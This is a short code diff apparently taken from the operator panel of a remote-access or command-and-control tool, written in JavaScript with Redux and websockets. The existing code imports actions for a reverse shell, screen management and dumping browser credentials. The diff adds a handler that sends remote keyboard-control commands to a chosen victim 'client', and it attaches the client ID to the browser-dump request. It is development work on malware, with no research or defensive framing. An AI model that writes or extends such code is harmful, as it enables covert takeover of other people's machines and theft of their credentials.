@@ -18,6 +18,7 @@ import {
 } from "@redux/actions/screenManagerActions";
 import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverseShellActions";
 import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
+import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
 
 
 const sendWebSocketMessage = (websocket, message) => {
@@ -290,6 +291,17 @@ export const handleDumpBrowser = async (websocket, store, action) => {
     const message = {
         ACTION: DUMP_BROWSER,
         channel_id: response.channel_id,
+        client_id: store.getState().client.selectedClient.systemInformation.UUID
+    };
+    sendWebSocketMessage(websocket, message);
+    console.log("Request browser execution to " + action.payload);
+}
+
+
+export const handleKeyboardController = async (websocket, store, action) => {
+    const message = {
+        ACTION: KEYBOARD_CONTROLLER,
+        command: action.payload.command,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
     sendWebSocketMessage(websocket, message);
